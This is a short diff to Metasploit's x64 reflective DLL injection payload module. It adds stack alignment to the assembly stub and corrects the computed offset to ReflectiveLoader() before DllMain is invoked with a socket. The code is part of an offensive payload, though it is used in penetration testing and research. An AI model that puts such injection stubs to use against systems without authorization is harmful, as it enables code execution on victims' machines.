@@ -45,12 +45,13 @@ module Payload::Windows::ReflectiveDllInject_x64
           push rbp              ; save rbp
           mov rbp, rsp          ; set up a new stack frame
           sub rsp, 32           ; allocate some space for calls.
+          and rsp, ~0xF         ; Ensure RSP is 16 byte aligned
         ; GetPC
           call $+5              ; relative call to get location
           pop rbx               ; pop return value
         ; Invoke ReflectiveLoader()
           ; add the offset to ReflectiveLoader()
-          add rbx, #{"0x%.8x" % (opts[:rdi_offset] - 0x11)}
+          add rbx, #{"0x%.8x" % (opts[:rdi_offset] - 0x15)}
           call rbx              ; invoke ReflectiveLoader()
         ; Invoke DllMain(hInstance, DLL_METASPLOIT_ATTACH, socket)
           ; offset from ReflectiveLoader() to the end of the DLL
